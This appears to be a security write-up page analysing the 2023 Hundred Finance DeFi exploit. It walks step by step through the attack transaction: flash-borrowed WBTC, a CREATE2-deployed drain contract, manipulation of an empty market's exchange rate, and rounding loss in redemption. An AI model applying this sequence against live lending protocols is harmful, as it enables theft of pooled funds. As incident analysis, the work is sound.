@@ -1,0 +1,1274 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2023/230415_HundredFinance/">
+      
+      
+        <link rel="prev" href="../230126_TINU/">
+      
+      
+        <link rel="next" href="../230905_FloorDAO/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
+    
+    
+      
+        <title>230415-HundredFinance - DeFiHackAnalysis</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#230415-hundredfinance" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DeFiHackAnalysis
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              230415-HundredFinance
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DeFiHackAnalysis
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221025_ULME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221129_MBC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221129-MBC-ZZSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2023
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2023
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230119_SHOCO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230119-SHICO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230126_TINU/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230126-TINU
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#precision-loss-rounding-error" class="md-nav__link">
+    <span class="md-ellipsis">
+      Precision Loss / Rounding Error
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#empty-market" class="md-nav__link">
+    <span class="md-ellipsis">
+      Empty Market
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_FloorDAO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-HeavensGate-JumpFarm-QuantumWN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231018_MicDao/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231206_TIME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    240415-ChaingeFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#precision-loss-rounding-error" class="md-nav__link">
+    <span class="md-ellipsis">
+      Precision Loss / Rounding Error
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#empty-market" class="md-nav__link">
+    <span class="md-ellipsis">
+      Empty Market
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="230415-hundredfinance">230415-HundredFinance</h1>
+<h2 id="attacktx">AttackTx</h2>
+<p>Analyzing the <a href="https://phalcon.blocksec.com/explorer/tx/optimism/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451">attack transaction</a> using Phalcon.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/1555.png" /></p>
+<p>The fund flow of this attack transaction is highly complex. From the Balance Changes, it's evident that the attacker ultimately obtained a significant amount of Ether, as well as DAI, USDT, and other tokens related to the Hundred Finance protocol. Additionally, the attacker borrowed WBTC from Aave to carry out the attack.</p>
+<h3 id="invocation-flow">Invocation Flow</h3>
+<p>Let's analyze the invocation flow.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/2318.png" /></p>
+<p>The attackContract initially borrowed 500 WBTC from Aave.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/2505.png" /></p>
+<p>Then, approximately 15 hWBTC were redeemed for about 0.3 WBTC.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/2652.png" /></p>
+<p>Afterward, all WBTC was transferred to a specified address, and a contract was created at that address using the CREATE2 instruction.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/3221.png" /></p>
+<p>In the constructor of the new contract, ETHDrain, first, <code>approve</code> was given to the hWBTC contract for WBTC. Then, 4e8 WBTC was passed into the <code>mint</code> function, resulting in 20,000,000,000 hWBTC. Subsequently, the <code>redeem</code> function was called, exchanging 19,999,999,998 hWBTC for 4 WBTC.</p>
+<p>There seems to be an issue here, as it appears that 2 hWBTC were obtained out of nowhere.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/4513.png" /></p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/4712.png" /></p>
+<p>However, upon closer inspection, it's revealed that the exchangeRate during <code>mint</code> was 20,000,000,000,000,000, whereas during <code>redeem</code>, it was 20,000,000,050,000,000. This means that the previous <code>mint</code> altered the rate, allowing the same hWBTC to redeem more WBTC. It's also noticeable that the quantity redeemable here is slightly larger than 400,000,000. However, the final result is truncated after <code>truncate</code>, indicating a <strong>precision loss</strong> issue.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/5233.png" /></p>
+<p>Subsequently, ETHDrain transferred slightly over 500 WBTC to the hWBTC contract, then <code>enterMarkets(hWBTC)</code>, and borrowed approximately 1021 Ether.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/5840.png" /></p>
+<p>Later, the <code>redeemUnderlying</code> function was called, exchanging 1 hWBTC for almost all of the WBTC previously transferred to the hWBTC contract. These WBTC were then returned to the original attackContract.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/2011.png" /></p>
+<p>Also, it's noted that due to <strong>precision loss</strong>, when calculating the amount of hWBTC required to redeem slightly over 500 WBTC, what was supposed to be repayed as 1.999999 hWBTC became 1 in reality.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/0510.png" /></p>
+<p>Then the attackContract called <code>liquidateBorrow</code> to liquidate the ETHDrain contract, reclaiming the remaining 1 hWBTC with a small amount of Ether.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/1007.png" /></p>
+<p>Finally, 1 hWBTC was exchanged for 2 WBTC.</p>
+<p>Clearly, through various operations in the ETHDrain contract, the attacker managed to obtain a substantial amount of Ether from the hETH contract.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/3144.png" /></p>
+<p>The subsequent flow follows a similar pattern, involving different tokens. Eventually, the attacker drained tokens from various lending pools in the Hundred Finance protocol.</p>
+<h2 id="vulnerability">Vulnerability</h2>
